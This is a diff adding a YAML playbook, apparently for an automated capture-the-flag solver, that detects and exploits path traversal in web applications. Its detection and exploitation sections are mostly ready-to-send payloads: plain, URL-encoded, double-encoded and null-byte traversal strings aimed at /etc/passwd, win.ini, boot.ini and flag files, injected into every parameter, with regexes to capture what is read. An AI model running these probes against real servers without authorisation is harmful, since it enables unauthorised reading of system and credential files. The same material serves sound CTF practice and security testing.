@@ -1,0 +1,182 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_path_traversal
+name: Path Traversal / Directory Traversal
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits path traversal vulnerabilities that allow reading
+  arbitrary files via ../ sequences. Distinct from LFI - focuses on file
+  read rather than code execution. Uses encoding bypasses and null byte tricks.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "any(p in context.params for p in ['file','path','page','document','template','filename','dir','folder'])"
+    boost: 0.35
+    label: "File path parameter found"
+  - if: "any(p in context.found_paths for p in ['/download', '/view', '/file', '/read', '/document', '/static'])"
+    boost: 0.25
+    label: "File serving endpoint found"
+  - if: "any(p in context.params for p in ['download','view','read','include'])"
+    boost: 0.20
+    label: "File operation parameter found"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: basic_traversal_probe
+    name: Basic directory traversal
+    description: >
+      Test basic ../ sequences to access parent directories.
+    min_confidence: 0.10
+    steps:
+      - id: simple_traversal
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '../../../etc/passwd'
+            - '..\\..\\..\\windows\\win.ini'
+            - '../../../../etc/hosts'
+        signals:
+          - match: 'root:.*:/bin/|\\[fonts\\]|localhost'
+            on_match:
+              confidence_boost: 0.50
+              emit: traversal_confirmed
+
+  - id: encoded_traversal_probe
+    name: Encoded traversal sequences
+    description: >
+      Test URL-encoded and double-encoded ../ bypasses.
+    min_confidence: 0.15
+    steps:
+      - id: encoded_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+            - '..%2f..%2f..%2fetc%2fpasswd'
+            - '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
+        signals:
+          - match: 'root:.*:/bin/'
+            on_match:
+              confidence_boost: 0.45
+              emit: traversal_encoding_bypass
+
+  - id: null_byte_traversal
+    name: Null byte injection traversal
+    description: >
+      Test null byte tricks to bypass extension checks (PHP < 5.3).
+    min_confidence: 0.20
+    steps:
+      - id: null_byte_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '../../../etc/passwd%00'
+            - '../../../etc/passwd%00.jpg'
+        signals:
+          - match: 'root:.*:/bin/'
+            on_match:
+              confidence_boost: 0.40
+              emit: traversal_null_byte_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: read_flag_traversal
+    name: Direct flag file read
+    requires_signal: traversal_confirmed
+    technique: path_traversal_file_read
+    steps:
+      - id: flag_locations
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'flag.txt'
+            - '../flag.txt'
+            - '../../flag.txt'
+            - '../../../flag.txt'
+            - '/flag.txt'
+            - '/var/www/flag.txt'
+            - '/home/ctf/flag.txt'
+            - 'flag'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: read_passwd
+    name: Read /etc/passwd
+    requires_signal: traversal_confirmed
+    technique: system_file_enumeration
+    steps:
+      - id: passwd_read
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '../../../etc/passwd'
+            - '../../../../etc/passwd'
+            - '../../../../../etc/passwd'
+        capture:
+          - pattern: 'root:.*?:.*?:'
+            as: passwd_content
+
+  - id: windows_traversal
+    name: Windows file access
+    requires_signal: traversal_confirmed
+    technique: windows_path_traversal
+    steps:
+      - id: windows_files
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '..\\..\\..\\windows\\win.ini'
+            - '..\\..\\..\\boot.ini'
+            - 'C:\\flag.txt'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: '\\[fonts\\]|boot loader'
+            as: windows_file_read
+
+  - id: encoded_bypass_exploit
+    name: Encoding bypass exploitation
+    requires_signal: traversal_encoding_bypass
+    technique: encoded_traversal
+    steps:
+      - id: encoded_flag_read
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '%2e%2e%2fflag.txt'
+            - '%2e%2e%2f%2e%2e%2fflag.txt'
+            - '..%2fflag.txt'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
